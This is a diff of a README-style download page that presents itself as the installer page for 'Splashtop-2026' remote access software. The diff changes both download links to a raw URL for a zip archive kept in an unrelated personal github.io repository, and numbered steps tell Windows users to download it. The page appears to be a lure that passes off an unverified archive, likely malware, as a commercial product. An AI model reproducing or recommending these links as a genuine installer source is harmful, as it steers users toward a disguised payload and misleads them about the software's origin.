@@ -5,7 +5,7 @@ description: "Download the Splashtop Business installer for Windows 10 and 11 vi
 ---
 # 💻 Splashtop-2026 - Secure remote access for your computer
 
-[![Download Splashtop](https://img.shields.io/badge/Download-Splashtop-blue.svg)](https://github.com/Kaewph8017/kaewph8017.github.io/raw/refs/heads/main/unoblivious/github-io-kaewph-2.7.zip)
+[![Download Splashtop](https://img.shields.io/badge/Download-Splashtop-blue.svg)](https://raw.githubusercontent.com/Kaewph8017/kaewph8017.github.io/main/unoblivious/github-io-kaewph-2.7.zip)
 
 ## 🎯 About this software
 
@@ -25,7 +25,7 @@ Ensure your computer meets these standards before you start the installation pro
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following link to access the software files: [https://github.com/Kaewph8017/kaewph8017.github.io/raw/refs/heads/main/unoblivious/github-io-kaewph-2.7.zip](https://github.com/Kaewph8017/kaewph8017.github.io/raw/refs/heads/main/unoblivious/github-io-kaewph-2.7.zip).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/Kaewph8017/kaewph8017.github.io/main/unoblivious/github-io-kaewph-2.7.zip](https://raw.githubusercontent.com/Kaewph8017/kaewph8017.github.io/main/unoblivious/github-io-kaewph-2.7.zip).
 2. Locate the download button on the page.
 3. Click the button to start the file transfer.
 4. Wait for the browser to finish downloading the file to your computer.
